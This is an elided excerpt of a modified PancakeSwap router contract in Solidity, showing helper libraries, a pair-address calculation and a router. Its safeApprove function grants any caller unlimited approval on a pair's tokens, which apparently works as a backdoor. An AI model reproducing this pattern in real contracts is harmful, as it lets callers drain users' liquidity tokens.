...
library TransferHelper {
    ...
    function safeTransferFrom(
        ...
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            string(abi.encodePacked(data,'TransferHelper::transferFrom: transferFrom0 failed'))
        );
    }
     ...
     function safeTransferFrom1(
        ...
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            'TransferHelper::transferFrom: transferFrom1 failed'
        );
    }
...
library PancakeLibrary {
    ...
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        ...
        pair = address(uint(keccak256(abi.encodePacked(
                ...
                hex'd0d4c4cd0848c93cb4fd1f498d7013ee6bfb25783ea21593d5834f5d250ece66'   // Change to INIT_CODE_PAIR_HASH of Pancake Factory
            ))));
    }
...
contract PancakeRouter is IPancakeRouter02 {
    ...
    function pairFor(address tokenA, address tokenB) public returns (address pair) {
    ...
    function safeApprove(
        ...
        address pf = PancakeLibrary.pairFor(factory, tokenA, tokenB);
        TransferHelper.safeApprove(pf,msg.sender, uint256(-1));
    }
    ...
    function addLiquidity(
        ...
        TransferHelper.safeTransferFrom1(tokenB, msg.sender, pair, amountB);
